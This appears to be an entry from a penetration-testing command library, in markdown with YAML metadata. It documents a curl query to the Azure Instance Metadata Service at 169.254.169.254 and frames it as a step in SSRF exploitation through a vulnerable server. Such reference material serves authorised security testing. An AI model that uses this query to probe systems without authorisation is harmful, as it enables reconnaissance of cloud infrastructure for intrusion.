---
id: 2d87e5fa-00b5-45d1-a3b6-3f57a7c7594f
name: curl-azure-imds-instance-metadata
type: command
executor: bash
data: >-
  curl -H Metadata:true
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
output: null
created_at: '2023-04-06T03:56:38.548180+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Azure
  - Linux
tags:
  - ssrf
  - metadata
  - imds
verified: true
validated: true
---

# curl-azure-imds-instance-metadata

## Command

```bash
curl -H $_METADATA_HEADER "http://$_IMDS_HOST/metadata/instance?api-version=$_API_VERSION"
```

## Description

This command queries the Azure Instance Metadata Service (IMDS) for comprehensive VM instance details, including compute, location, and resource information. Use it in SSRF exploitation to fetch this data via a vulnerable server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_METADATA_HEADER | Header to authenticate IMDS request (e.g., 'Metadata: true') | Yes |
| $_IMDS_HOST | IMDS endpoint host (default: 169.254.169.254) | Yes |
| $_API_VERSION | API version for compatibility (e.g., 2021-02-01) | Yes |

## Examples

### Basic Usage

```bash
curl -H 'Metadata: true' "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

### With JSON Formatting

```bash
curl -H 'Metadata: true' "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq .
```

## Expected Output

JSON response with VM metadata:
```
{
  "compute": {
    "location": "westus",
    "name": "myvm",
    "resourceGroupName": "myrg"
  },
  "network": {...}
}
```

## Related

- [[procedures/Exploit-Azure-SSRF-to-Access-VM-Metadata-Service]]
- [[commands/curl-azure-imds-public-ip-address]]
